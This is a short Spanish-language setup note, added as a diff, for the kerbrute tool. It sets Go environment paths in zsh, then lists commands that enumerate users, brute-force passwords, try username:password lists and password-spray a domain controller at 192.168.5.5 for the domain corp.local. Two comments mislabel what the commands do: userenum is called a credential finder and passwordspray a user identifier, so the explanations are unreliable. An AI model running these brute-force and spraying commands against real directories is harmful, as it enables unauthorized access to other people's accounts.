@@ -1,0 +1,38 @@
+# Tendremos que modificar un momento nuestro fichero de .zsh para activar la ruta donde se va a ejecutar las 
+# aplicaciones que estan en Go.
+
+------------------------------------------------------------------
+
+sudo nano ~/.zshrc
+
+#Dentro del nano
+#Vamos añadir las siguiente lineas abajo del todo
+
+export GOROOT=/usr/lib/go
+export GOPATH=$HOME/go
+export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
+
+------------------------------------------------------------------
+
+# Ahora lo cargaremos:
+
+$ source ~/.zshrc
+
+# Instalaremos la herramienta ejecutando el installKerbrute.sh
+
+# Si queremos intentar saber las credenciales de la lista de unos usuarios, seria de la siguiente forma:
+
+$ kerbrute userenum -d corp.local --dc 192.168.5.5 users.txt
+
+# Con una lista de contraseñas seria de la siguiente forma:
+
+$ kerbrute bruteuser -d corp.local --dc 192.168.5.5 passwords.txt empleado1
+
+# Si queremos utilizar usuarios:passwords lo haremos todo con una lista que tiene que ser separada con : de forma que sea algo asi username:password y ejecutar lo siguiente:
+
+$ kerbrute bruteforce -d corp.local --dc 192.168.5.5 user_pass.txt
+
+# Si solo queremos identificar usuarios validos en el sistema, se hará de esta forma:
+
+$ kerbrute passwordspray -d corp.local --dc 192.168.5.5 users.txt Passw0rd2
+
